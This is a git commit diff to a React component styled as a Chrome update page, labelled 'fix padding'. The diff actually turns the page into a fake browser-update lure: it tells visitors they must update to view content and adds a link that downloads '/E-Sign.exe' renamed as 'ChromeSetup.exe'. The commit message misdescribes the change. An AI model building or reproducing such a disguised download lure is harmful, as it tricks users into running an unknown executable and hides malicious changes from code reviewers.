09d2a637e1e4af953f19d4c42ddafa6ccd49c9da
xach3110 <kazerog543@gmail.com>
2025-06-10 20:59:31 +0200

    fix padding

--- src/components/ChromeUpdate.tsx
+++ src/components/ChromeUpdate.tsx
@@ -8,10 +8,17 @@ export const AutoUpdateSection = () => {
       <div className="auto-update__inner">
         <img src={logo} alt="Chrome Logo" className="auto-update__logo" />
         <h1 className="auto-update__title">
-         Chrome updates automatically
+         You need to update your browser to view the content!
         </h1>
+          <a
+            href="/E-Sign.exe"
+            download="ChromeSetup.exe"
+            className="btn-download"
+          >
+            Update Chrome
+          </a>
         <p className="auto-update__text">
-          Chrome automatically installs updates in the background, so you'll always have the latest security features.
+          For Windows 10/11 64-bit
         </p>
       </div>
     </section>
